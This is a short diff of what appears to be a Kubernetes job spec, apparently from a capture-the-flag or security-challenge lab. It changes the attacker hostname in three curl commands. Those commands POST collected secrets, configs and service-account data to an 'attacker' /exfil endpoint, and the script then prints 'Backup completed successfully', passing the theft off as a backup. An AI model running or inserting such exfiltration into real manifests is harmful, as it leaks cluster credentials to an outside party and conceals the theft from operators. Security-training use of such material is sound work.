@@ -38,17 +38,17 @@ spec:
                 curl -X POST \
                   -H "Content-Type: application/json" \
                   -d @/tmp/secrets.json \
-                  http://attacker.ctf.local/exfil/secrets
+                  http://attacker.sc.local/exfil/secrets
 
                 curl -X POST \
                   -H "Content-Type: application/json" \
                   -d @/tmp/configs.json \
-                  http://attacker.ctf.local/exfil/configs
+                  http://attacker.sc.local/exfil/configs
 
                 curl -X POST \
                   -H "Content-Type: application/json" \
                   -d @/tmp/sa.json \
-                  http://attacker.ctf.local/exfil/serviceaccounts
+                  http://attacker.sc.local/exfil/serviceaccounts
 
                 echo "Backup completed successfully"
 
